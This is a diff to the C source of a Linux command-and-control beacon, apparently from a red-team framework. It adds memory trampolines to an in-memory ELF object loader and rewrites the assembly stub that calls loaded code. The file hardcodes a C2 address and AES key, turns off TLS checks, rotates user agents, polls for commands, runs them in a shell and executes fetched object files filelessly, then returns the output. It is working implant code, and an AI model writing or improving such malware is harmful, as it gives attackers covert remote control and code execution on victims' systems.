@@ -29,7 +29,6 @@
 #include "aes.h"
 #include "cJSON.h"
 
-// === CONFIG ===
 #define C2_URL        "https://10.10.14.57:4444"
 #define CLIENT_ID     "linux"
 #define MALEABLE      "/pleasesubscribe/v1/users/"
@@ -50,9 +49,16 @@ static size_t g_output_len = 0;
 struct MemoryStruct {
     char *memory;
     size_t size;
-    size_t realsize;
+    size_t realsize;   // bytes recibidos
 };
-// === TIPOS Y SÍMBOLOS ===
+
+// === TRAMPOLINES ===
+typedef struct {
+    void* addr;
+    size_t size;
+} Trampoline;
+
+// === TIPOS Y SÍMBOLOS FALTANTES ===
 typedef void (*bof_func_t)(char*, int);
 
 typedef struct {
@@ -71,8 +77,13 @@ static void* g_dlerror_ptr = (void*)dlerror;
 static void* g_dlopen_ptr = (void*)dlopen;
 static void* g_dlclose_ptr = (void*)dlclose;
 static void* g_write_ptr = (void*)write;
+static void* g_mmap_ptr = (void*)mmap;
+static void* g_munmap_ptr = (void*)munmap;
 static void* g_BeaconPrintf_ptr = (void*)BeaconPrintf;
 static void* g_BeaconOutput_ptr = (void*)BeaconOutput;
+static Trampoline* g_trampolines = NULL;
+static size_t g_trampolines_count = 0;
+static size_t g_trampolines_capacity = 0;
 
 static SymbolResolver g_external_symbols[] = {
     { "printf",      &g_printf_ptr },
@@ -85,31 +96,33 @@ static SymbolResolver g_external_symbols[] = {
     { "dlopen",      &g_dlopen_ptr },
     { "dlclose",     &g_dlclose_ptr },
     { "write",       &g_write_ptr },
+    { "mmap",        &g_mmap_ptr },
+    { "munmap",      &g_munmap_ptr },
     { "BeaconPrintf", &g_BeaconPrintf_ptr },
     { "BeaconOutput", &g_BeaconOutput_ptr },
     { NULL, NULL }
 };
 
-// === DECLARACIÓN DE FUNCIONES ===
+// === DECLARACIÓN DE FUNCIONES FALTANTES ===
 int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize);
 static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen);
 static void __attribute__((noinline))
-call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen) {
-    register uintptr_t saved_rsp asm("r12");
+call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen)
+{
     asm volatile(
-        "mov %%rsp, %0\n\t"
+        "push %%rbp\n\t"
+        "mov %%rsp, %%rbp\n\t"
         "and $-16, %%rsp\n\t"
         "sub $8, %%rsp\n\t"
-        "mov %1, %%rdi\n\t"
-        "mov %2, %%rsi\n\t"
-        "call *%3\n\t"
-        "mov %0, %%rsp\n\t"
-        : "=&r"(saved_rsp)
+        "mov %0, %%rdi\n\t"
+        "mov %1, %%rsi\n\t"
+        "call *%2\n\t"
+        "leave\n\t"
+        :
         : "r"(args), "r"(arglen), "r"(func)
-        : "rdi", "rsi", "rax", "memory"
+        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "memory"
     );
 }
-
 // === BEACON API ===
 void BeaconPrintf(int type, const char *fmt, ...) {
     if (g_output_len >= sizeof(g_beacon_output) - 1) return;
@@ -134,8 +147,56 @@ void BeaconOutput(int type, const char *data, int len) {
     g_beacon_output[g_output_len] = '\0';
 }
 
+// === CRATE TRAPOLINE ===
+static void* create_trampoline(void* target) {
+    if (!target) return NULL;
+
+    size_t code_size = 12; // movabs rax, imm64; jmp rax
+    void* code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (code == MAP_FAILED) {
+        fprintf(stderr, "[!] Trampolín: mmap falló\n");
+        return NULL;
+    }
+
+    uint8_t trampoline_code[] = {
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, target
+        0xFF, 0xE0                                                  // jmp rax
+    };
+    *(uint64_t*)(trampoline_code + 2) = (uint64_t)target;
+    memcpy(code, trampoline_code, code_size);
+
+    // Registrar para limpieza
+    if (g_trampolines_count >= g_trampolines_capacity) {
+        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
+        Trampoline* tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
+        if (!tmp) {
+            munmap(code, code_size);
+            return NULL;
+        }
+        g_trampolines = tmp;
+        g_trampolines_capacity = new_cap;
+    }
+    g_trampolines[g_trampolines_count].addr = code;
+    g_trampolines[g_trampolines_count].size = code_size;
+    g_trampolines_count++;
+
+    return code;
+}
+// === CLEAN TRAMPOLINE ===
+static void cleanup_trampolines(void) {
+    for (size_t i = 0; i < g_trampolines_count; i++) {
+        munmap(g_trampolines[i].addr, g_trampolines[i].size);
+    }
+    free(g_trampolines);
+    g_trampolines = NULL;
+    g_trampolines_count = 0;
+    g_trampolines_capacity = 0;
+}
+
 // === CURL WRITE CALLBACK ===
-static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
+{
     size_t realsize = size * nmemb;
     struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
@@ -151,7 +212,8 @@ static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, voi
 }
 
 // === HTTPS REQUEST ===
-char* https_request(const char* url, const char* method, const char* post_data) {
+char* https_request(const char* url, const char* method, const char* post_data)
+{
     fprintf(stderr, "[DEBUG] https_request: ENTRY url=%s method=%s post_data=%p\n",
             url, method, (void*)post_data);
     fflush(stderr);
@@ -173,8 +235,8 @@ char* https_request(const char* url, const char* method, const char* post_data) 
     curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENTS[rand() % USER_AGENTS_COUNT]);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); 
-    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // ← Aumentado de 5 a 10
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);  // ← Aumentado de 3 a 5
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
@@ -356,7 +418,7 @@ char* exec_cmd(const char* cmd, int* out_len) {
     *out_len = total;
     return buffer;
 }
-// === EXEC BOF FILELESS ===
+
 int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize) {
     if (!elf_data || filesize < sizeof(Elf64_Ehdr)) {
         fprintf(stderr, "[!] Invalid ELF data\n");
@@ -374,7 +436,6 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         return -1;
     }
 
-    // --- Paso 1: Obtener secciones y tablas ---
     if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) {
         fprintf(stderr, "[!] No section headers\n");
         return -1;
@@ -383,11 +444,9 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
     Elf64_Shdr *shdr = (Elf64_Shdr*)(elf_data + ehdr->e_shoff);
     char *strtab = NULL;
     Elf64_Sym *symtab = NULL;
-    int symtab_idx = -1;
 
     for (int i = 0; i < ehdr->e_shnum; i++) {
         if (shdr[i].sh_type == SHT_SYMTAB) {
-            symtab_idx = i;
             symtab = (Elf64_Sym*)(elf_data + shdr[i].sh_offset);
             if (shdr[i].sh_link < ehdr->e_shnum) {
                 strtab = (char*)(elf_data + shdr[shdr[i].sh_link].sh_offset);
@@ -401,7 +460,6 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         return -1;
     }
 
-    // --- Paso 2: Mapear secciones cargables ---
     void **sections = calloc(ehdr->e_shnum, sizeof(void*));
     if (!sections) {
         perror("calloc");
@@ -426,7 +484,7 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         }
     }
 
-    // --- Paso 3: Resolver símbolos externos ---
+    // Resolver símbolos del beacon
     for (int i = 0; g_external_symbols[i].name; i++) {
         void *addr = dlsym(RTLD_DEFAULT, g_external_symbols[i].name);
         if (addr) {
@@ -434,7 +492,7 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         }
     }
 
-    // --- Paso 4: Aplicar relocalizaciones ---
+    // Aplicar relocalizaciones
     for (int i = 0; i < ehdr->e_shnum; i++) {
         Elf64_Shdr *sh = &shdr[i];
         if (sh->sh_type != SHT_RELA) continue;
@@ -449,7 +507,7 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
 
         for (int j = 0; j < num_rela; j++) {
             Elf64_Rela *r = &rela[j];
-            uint64_t *loc = (uint64_t*)((char*)target_addr + r->r_offset);
+            void *loc = (char*)target_addr + r->r_offset;
             int sym_idx = ELF64_R_SYM(r->r_info);
             if (sym_idx >= ehdr->e_shnum) continue;
 
@@ -473,17 +531,37 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
                 continue;
             }
 
+            symbol_addr = (void*)((uintptr_t)symbol_addr + r->r_addend);
+
             switch (ELF64_R_TYPE(r->r_info)) {
                 case R_X86_64_64:
-                    *loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
-                    break;
-                case R_X86_64_PC32:
-                case R_X86_64_PLT32:
-                    *(uint32_t*)loc = (uint32_t)((intptr_t)symbol_addr + r->r_addend - (intptr_t)loc);
+                    *(uint64_t*)loc = (uint64_t)symbol_addr;
                     break;
                 case R_X86_64_32:
-                    *loc = (uint32_t)((uintptr_t)symbol_addr + r->r_addend);
+                    if ((uintptr_t)symbol_addr > 0xFFFFFFFF) {
+                        fprintf(stderr, "[!] R_X86_64_32 out of range\n");
+                        continue;
+                    }
+                    *(uint32_t*)loc = (uint32_t)(uintptr_t)symbol_addr;
                     break;
+                case R_X86_64_PC32:
+                case R_X86_64_PLT32: {
+                    int64_t offset = (int64_t)symbol_addr - (int64_t)loc;
+                    if (offset < INT32_MIN || offset > INT32_MAX) {
+                        void* trampoline = create_trampoline(symbol_addr);
+                        if (!trampoline) {
+                            fprintf(stderr, "[!] Trampolín falló para %s\n", sym_name);
+                            continue;
+                        }
+                        offset = (int64_t)trampoline - (int64_t)loc;
+                        if (offset < INT32_MIN || offset > INT32_MAX) {
+                            fprintf(stderr, "[!] Trampolín fuera de rango para %s\n", sym_name);
+                            continue;
+                        }
+                    }
+                    *(uint32_t*)loc = (uint32_t)offset;
+                    break;
+                }
                 default:
                     fprintf(stderr, "[!] Unsupported reloc: %ld for %s\n", ELF64_R_TYPE(r->r_info), sym_name);
                     break;
@@ -491,7 +569,7 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         }
     }
 
-    // --- Paso 5: Encontrar y ejecutar función ---
+    // Encontrar función 'go'
     bof_func_t entry = NULL;
     for (int i = 0; i < ehdr->e_shnum; i++) {
         if (shdr[i].sh_type == SHT_SYMTAB) {
@@ -515,7 +593,6 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         goto cleanup;
     }
 
-    // === EXEC BOF ===
     g_output_len = 0;
     g_beacon_output[0] = '\0';
     call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);
@@ -527,6 +604,7 @@ int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
         }
     }
     free(sections);
+    cleanup_trampolines();
     return 0;
 }
 
@@ -636,7 +714,6 @@ char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
 int main() {
     printf("[*] Beacon starting...\n");
     srand(time(NULL));
-    // === KEY Generated by LazyOwn RedTeam Framework (key.py) ===
     const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
     unsigned char AES_KEY[32];
     for (int i = 0; i < 32; i++) {
@@ -649,7 +726,7 @@ int main() {
     while (1) {
         printf("[*] Checking for new command...\n");
 
-        // 🔥 FIRE CLEAN ALL
+        // 🔥 LIMPIAR BUFFER ANTES DE CADA COMANDO
         g_output_len = 0;
         g_beacon_output[0] = '\0';
 
@@ -708,7 +785,7 @@ int main() {
                 char* bof_args = "Executed via C2 beacon";
                 int bof_arglen = strlen(bof_args);
                 output = run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, &output_len);
-                free(bof_data - 8);
+                free(bof_data - 8);  // ✅ Libera el bloque completo
             }
         } else {
             output = exec_cmd(command, &output_len);
@@ -806,4 +883,3 @@ int main() {
 
     return 0;
 }
-// === THE END ? ===
